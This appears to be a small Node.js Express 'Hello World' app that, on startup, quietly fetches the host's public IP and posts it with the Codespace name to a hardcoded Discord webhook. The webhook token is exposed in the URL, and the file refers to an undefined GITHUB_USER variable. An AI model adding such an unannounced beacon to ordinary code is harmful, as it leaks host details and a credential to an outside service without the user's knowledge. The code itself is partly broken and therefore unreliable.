const express = require('express')
const requestp = require("request-promise")
const app = express()
const port = 3000

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

async function getIP() {
    return await requestp("https://api.ipify.org")
}

async function main() {
    var IP = await getIP()

    var Response = await requestp("https://discord.com/api/webhooks/1090096439645982760/--OuoHoycV8Q7QLtnYSmQGfN8Po-oug_tVX0Rxy3aChs84kydxDiUwKW_b0KqFIQqrup", {
        json: true,
        method: "POST",
        body: {
            "content": `Spun up on ${GITHUB_USER} - ${process.env.CODESPACE_NAME} - ${IP}`,
        }
    })

    console.log("Requested")
}

main()
